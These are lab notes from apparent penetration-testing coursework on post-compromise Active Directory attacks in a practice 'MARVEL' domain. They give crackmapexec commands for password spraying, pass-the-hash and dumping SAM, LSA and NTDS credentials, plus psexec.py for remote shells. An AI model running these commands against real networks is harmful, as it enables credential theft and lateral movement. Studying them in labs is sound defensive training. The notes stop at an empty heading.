Attacks covered in this section involve having some sort of credential first.
- Username & Password
- Shell on a machine

**Attacks:**
- Pass the hash
- Pass the password
- Token impersonation 
- Kerberoasting 
- GPP/cPassword attacks
	- https://www.hackingloops.com/gpp-cpassword-attack-the-tale-of-leaked-key/
- Golden Ticket attacks

### Pass the Password Pass the Hash

If we crack a password or can dump the SAM hashes, we can leverage both for lateral movement in networks.

Tools: crackmapexec

Use:
```sh
crackmapexec 10.0.3.0/24 -u fcastle -d MARVEL -p Password1
```

![](img/crackmap01.png)

```sh
crackmapexec <ip/CIDR> -u <username> -d <domain> -p <password>
```

Grab local hashes (metasploit)

![](img/crackmap02.png)

Pass the hash

```sh
crackmapexec <ip/CIDR> -u <username> -H <hash> --local
```

![](img/crackmap03.png)

You don't need to crack the password to pass the hash. 

Install crackmapexec
```sh
sudo apt install crackmapexec
```

View help screen
```sh
crackmapexec --help
```

**New Syntax for CrackMapExec**
```sh
crackmapexec smb <ip/CIDR> -u <username> -d <domain> -p <password> 
```
- It looks like you just need to add the smb part now

So for the lab we'd use
```sh
crackmapexec smb 10.0.3.5/24 -u fcastle -d MARVEL.local -p Password1
```

![](img/crackmap04.png)
_The smb part is not in this command, but make sure to use it_

Here what you're looking at is that crackmap has owned the spiderman account as it already knew about the punisher account (fcastle).

Trying to dump the SAM file, which doesn't always work:
```sh
crackmapexec smb 10.0.3.5/24 -u fcastle -d MARVEL.local -p Password1 --sam
```
- Other options to try and dump
	- lsa
	- ntds

**psexec**
```sh
psexec.py marvel/fcastle:Password1@10.0.3.5
```

We can also use the matasploit version to try and get a meterpreter session.

You want to avoid using this for password spraying because you could end up locking out the users if the have a failed login attempt policy in place. You can try that with a local account. Local accounts don't have the same lockout policy like domain accounts do.

### How to Dump Hashes

Previously, we discover that .142 and .141 have the same local admin account of Frank Castle.












